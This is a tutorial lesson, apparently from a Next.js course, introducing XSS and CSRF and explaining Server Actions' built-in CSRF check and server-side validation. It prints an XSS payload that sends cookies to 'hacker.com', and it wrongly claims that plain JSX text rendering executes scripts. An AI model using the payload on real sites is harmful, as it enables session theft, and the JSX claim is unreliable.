In 8.1, we learned how to keep secrets safe — `.env` + server-only. But secrets were just one problem — **the other problem is input.** Think — if your Photo Gallery has a form (any form), and a user types whatever they want and submits it — something like `<script>alert('hacked')</script>`. If you push that input straight into the database or render it — then the attacker's script runs on your site. That's **XSS (Cross-Site Scripting).**

And if there's a form (like "Add Comment"), and an attacker sends a malicious link to your site's user — the user clicks and the form data gets submitted through their browser without their consent — that's **CSRF (Cross-Site Request Forgery).**

In this file, we'll only understand at a **awareness level** — what the problem is, and how Next.js' **Server Actions** already solve this **built-in.** We won't learn to manually implement CSRF tokens (the roadmap says "awareness").

---

## Manual Problem — Trusting Client Input

When you take data from a form and push it straight into the database, you're implicitly **trusting that the client is sending valid data.** But the client is controlled by the user — they can send anything.

**XSS — Injecting a Malicious Script:**

If there's a comment form and the user submits:

```html
<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
```

If you render that input directly on the page (without sanitizing):

```tsx
// ❌ Wrong — rendering directly
<p>{comment}</p>
```

The browser sees "this is a script" and executes it. The hacker gets your session cookie.

**CSRF — Submitting Form Without User's Consent:**

If your form looks like:

```html
<form action="/api/delete-photo" method="POST">
  <input type="hidden" name="photoId" value="5" />
  <button>Delete</button>
</form>
```

An attacker creates a malicious page with this form hidden. When the user visits that page, the form automatically submits through their browser — the photo gets deleted without the user's consent. **The user didn't even click anything, the form submitted.**

---

## CONCEPT — Next.js Server Actions' Built-in CSRF Protection

Now here's the good news — **in Next.js Server Actions, this is all built-in.**

Server Actions (learned in Batch 3 — the `'use server'` directive) come with **automatic CSRF protection** in Next.js:

1. **Origin/Host Header Check** — When a Server Action is called, Next.js checks whether the request **came from your domain** or from somewhere else. If it came from another domain (a malicious page) — the request is rejected.

2. **Server-Side Only** — Server Action code runs only on the server. The client gets only a reference to the function — not the actual logic. So attackers can't call the function directly.

**What this means:** If you're using Server Actions (not Route Handlers), then CSRF protection **is automatic.** You don't need to manually create CSRF tokens.

---

## CODE — Server Action's Built-in Protection

**File:** `app/actions.ts` — Server Action with automatic CSRF

```ts
'use server'

import { prisma } from "@/lib/prisma";

export async function deletePhoto(photoId: number) {
  // Next.js has already checked:
  // 1. Does the Origin header match your domain?
  // 2. Does the Host header match?
  // If not → request rejected, never reaches here

  await prisma.photo.delete({
    where: { id: photoId },
  });
}
```

You didn't do anything extra — just wrote `'use server'`. **Next.js is checking CSRF by itself.**

---

## CONCEPT — Server-Side Validation (Awareness)

CSRF is built-in, but **input validation is your job.** The client can send anything — you must validate it on the server:

```ts
'use server'

export async function addComment(photoId: number, text: string) {
  // ❌ Trusted input — anything can come through
  // await prisma.comment.create({ data: { photoId, text } });

  // ✅ Server-side validation
  if (!text || text.trim().length === 0) {
    throw new Error("Comment cannot be empty");
  }
  if (text.length > 500) {
    throw new Error("Comment too long (max 500 characters)");
  }
  if (!photoId || photoId <= 0) {
    throw new Error("Invalid photo ID");
  }

  await prisma.comment.create({
    data: { photoId, text: text.trim() },
  });
}
```

**Golden Rule:** Always **validate client input on the server.** Client-side validation is only for UX (instant feedback) — server-side validation is for security (the real check).

## TEST — Verify CSRF Protection

1. Call any Server Action in your Photo Gallery (like photo delete)
2. DevTools → Network tab → click on the request → Headers
3. Check the `Origin` header — it should be your domain (`http://localhost:3000`)
4. Now open a different browser tab with `localhost:3000` and call the action directly from the console — it will work (same origin)

**If there's an attacker page:**
- Attacker page is at `evil.com`
- It calls your action
- Next.js checks: Origin = `evil.com`, expected = `localhost:3000` → **mismatch → reject**

This is CSRF protection — built-in, automatic, you don't need to do anything.

## Nutshell

**XSS** is when an attacker injects a malicious script into your page. **CSRF** is when an attacker submits your form through your user's browser without their consent. In Next.js **Server Actions**, CSRF protection is **built-in** — automatic rejection via Origin/Host header check. You just need **server-side validation** — always validate client input on the server, use client-side validation only for UX.

---

## What It Is NOT

- **Server Action = "CSRF fix-all" is NOT true.** CSRF is built-in, but input validation is still your job. Invalid data can still get inserted if you don't validate.
- **Client-side validation = security is NOT true.** Client-side validation is only UX (instant feedback). An attacker can bypass client-side checks (through DevTools, or by calling the API directly) — always validate on the server.
- **CSRF = "only form submit attacks" is NOT true.** CSRF can happen on any state-changing request — form submit, button click, or any mutation.
- **Manual CSRF token = "old approach" is NOT true.** In Express.js/Angular, manual CSRF tokens are standard. Next.js has made it built-in — so you don't need to do it separately.

2. Why doesn't client-side validation provide security?

<details>
<summary>Show Answer</summary>

**Sample Answer:** Client-side validation runs in the browser — an attacker can bypass it (through DevTools, or by calling the API directly). Server-side validation is the real security — when data arrives at the server, that's where it gets validated. Client-side validation is only UX (instant feedback), not security.

</details>

3. What's the difference between XSS and CSRF?

<details>
<summary>Show Answer</summary>

**Sample Answer:** **XSS** — an attacker injects a malicious script into your page (like a `<script>` tag), which runs in the user's browser. **CSRF** — an attacker submits your form through your user's browser (via a malicious page) without the user's consent. They are different attacks with different fixes.

</details>
